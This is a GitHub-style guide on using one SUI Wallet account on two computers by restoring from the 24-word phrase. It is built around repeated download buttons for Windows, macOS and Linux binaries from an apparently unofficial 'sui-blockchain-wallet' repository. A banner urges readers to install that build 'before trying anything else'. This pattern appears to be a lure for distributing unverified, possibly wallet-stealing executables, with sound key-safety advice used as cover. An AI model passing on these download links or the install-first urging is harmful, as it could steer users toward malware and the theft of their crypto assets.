![SUI Wallet](assets/banner-article.png)

# Running SUI Wallet on another computer

The same account on a second machine means restoring from the phrase, not copying a folder.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Install the same release on the second machine and restore the account from the 24 words; there is nothing to
copy between installations. Both machines then show the same address and the same balance, because both derive
it from the phrase and read the chain. The phrase is the only thing that has to travel.

## Why nothing is copied

An installation is a program with a local profile, and neither is the account. The account is computed from the words, so a second machine needs the words and a download rather than a folder copied from the first. That is the whole move.

That also means the two installations never need to agree about anything. Copying a profile between machines
does not move an account; entering the phrase creates one that was always the same one.

It also means the two machines cannot drift apart in any way that matters. What one knows, both know, because neither is storing the account; both are reading the same chain from the same words.

## What has to travel

One thing, and it should not travel digitally: the 24 words, in order, on paper. Writing them into a message,
a note or a cloud file to move them between machines turns a hardware move into a secret in a chat log.

If the phrase is not written down yet, write it down on the machine you are leaving, check it against what the
app shows, and then carry the paper.
[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) covers the check that makes the copy trustworthy.

## Installing on the second machine

Take the file for that platform from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) - the installer for Windows, the disk image for macOS, the archive for Linux - and check its digest before running it, exactly as on the first machine. Nothing else about the procedure changes.

The requirement is the same on the second machine as on the first: Windows 10 build 1909 or later 64-bit,
macOS 12 or later, x64 Linux on Ubuntu 20.04 or equivalent.
The requirement is worth checking if the second machine is older than the first, since an unsupported build is
the usual reason a first launch fails.

## First launch on the new machine

Choose the restore route rather than creating a new account, and enter the words in order. The address that appears should be the one on the old machine, character for character, and anything else means a different phrase was typed.

If it is not, stop and compare the paper against itself rather than restoring repeatedly. A restore from the
same words always produces the same address, so a different one means a different phrase was entered.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) covers the screen and the discovery that follows it.

## Two machines, one account

Both installations can stay. Neither holds the balance, so there is nothing to keep in step, and a transaction sent from one appears on the other as soon as it reads the chain again. The phrase, not the state, is what to look after.

The practical caution is the phrase, not the state. Two machines means two places the words could be typed,
and the one that is stolen is the one that was typed into the wrong window.

## What not to do

Do not copy the profile folder and expect an account. Do not install an older release because that is the
version the other machine runs. And do not restore on the second machine while the first one is still open on
a screen that displays the phrase, since a shared screen is a shared secret.

None of those is about the software behaving badly; they are about the only asset that matters being handled
twice instead of once.

There is one more: leaving a restored copy on a machine you do not control. A borrowed laptop with a working wallet on it is a wallet somebody else can open while you are away from the desk.

## If the machine is temporary

On a borrowed machine, the order reverses: install, restore, use, uninstall, and remove the local profile
before handing it back. A machine you do not keep is a machine whose copy of the phrase should not outlive the
session.
[How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) covers what an uninstaller leaves behind, which is the part
that matters when the hardware is not yours.

That order is deliberate: removing the application before the phrase is verified loses the only readable copy on that machine. Verify, then remove, then hand it back.

## FAQ

### Can I use the same account on two computers?

Yes. Both derive the same address from the same 24 words, and the chain has one record of it. There is no link
between the installations to set up.

### Do I need to copy any files?

No. Copy the paper, install the release, restore the phrase. A copied profile is not an account and will not
produce one.

### Will both machines show the same balance?

Yes, once each has read the chain. A machine that shows an older figure is behind on reading, not holding a
different account.

### What if the address on the new machine is different?

The phrase entered differs from the one used originally, even if it looks similar. Compare against the paper
copy word by word rather than restoring again.

### Can I send from either machine?

Yes. A signature from either copy is valid, which is also why the phrase deserves more care once it exists in
two places.

### Does the second machine need the same operating system?

No. The account is the same across Windows, macOS and Linux, and the release has a file for each.
